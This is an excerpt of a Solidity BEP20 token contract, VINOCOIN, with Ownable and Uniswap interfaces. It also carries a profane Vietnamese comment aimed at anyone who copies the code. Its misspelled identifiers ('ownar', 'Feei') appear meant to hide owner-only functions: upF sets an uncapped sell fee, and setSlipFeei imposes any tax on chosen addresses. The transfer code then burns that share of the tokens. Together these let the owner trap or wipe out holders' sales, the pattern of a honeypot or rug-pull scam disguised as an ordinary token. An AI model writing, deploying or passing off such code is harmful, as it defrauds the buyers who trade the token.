...
abstract contract Ownable is Context {
    address private _ownar;

    event ownarshipTransferred(address indexed previousownar, address indexed newownar);
    /**
     * @dev Initializes the contract setting the deployer as the initial ownar.
     */
    constructor() {
        _transferownarship(_msgSender());
    }
     ...
     * NOTE: Dit me thang nao` lay code bo may`
     ...
     */
    function transferownarship(address newownar) public virtual onlyownar {
        require(newownar != address(0), "Ownable: new ownar is the zero address");
        _transferownarship(newownar);
    }//7
     ...
     */
    function _transferownarship(address newownar) internal virtual {
 ...
 *Dit me thang nao` lay code bo may`
...
interface IUniswapV2Factory {
    ...
    function FeeiTo() external view returns (address);
    function FeeiToSetter() external view returns (address);
    ...
    function setFeeiTo(address) external;
    function setFeeiToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFeeiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingFeeiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFeeiOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract VINOCOIN is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellFeei = 0;

    uint256 private _defaultBuyFeei = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFeei;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellFeei = _value;
    }

    function setSlipFeei(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFeei[_address] = _value;
    }

    function getSlipFeei(address _address) external view onlyownar returns (uint256) {
        return _slipFeei[_address];
    }


    function setMAccountFeei(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountFeei(address _address) external view onlyownar returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradeFeei = _defaultSellFeei;
                }
                if (from == uniswapV2Pair) {

                    tradeFeei = _defaultBuyFeei;
                }
            }
            if (_slipFeei[from] > 0) {
                tradeFeei = _slipFeei[from];
            }

            tradeFeeiAmount = _Amount.mul(tradeFeei).div(100);
        }


        if (tradeFeeiAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFeeiAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeiAmount);
            emit Transfer(from, _deadAddress, tradeFeeiAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeFeeiAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeFeeiAmount);
        emit Transfer(from, _to, _Amount - tradeFeeiAmount);
    }
